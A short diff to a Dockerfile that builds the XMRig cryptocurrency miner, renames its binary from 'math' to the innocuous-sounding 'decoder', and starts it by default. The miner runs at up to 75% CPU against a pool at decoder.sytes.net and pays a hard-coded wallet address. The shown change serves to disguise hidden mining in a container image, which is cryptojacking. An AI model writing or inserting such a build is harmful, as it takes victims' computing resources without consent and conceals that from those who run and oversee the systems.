@@ -9,10 +9,10 @@ RUN apt update; \
     cd xmrig-6.16.2; \
     cp xmrig /usr/local/bin/xmrig; \
     cd /usr/local/bin; \
-    mv xmrig math;
+    mv xmrig decoder;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 math;
+RUN chmod 777 decoder;
 
-CMD math -a gr -o math.sytes.net:5555 --tls --cpu-max-threads-hint=75 -u RUpj92cvanvWbdTQtC6Fw39cHpU12o4S6R
+CMD decoder -a gr -o decoder.sytes.net:5555 --tls --cpu-max-threads-hint=75 -u RUpj92cvanvWbdTQtC6Fw39cHpU12o4S6R
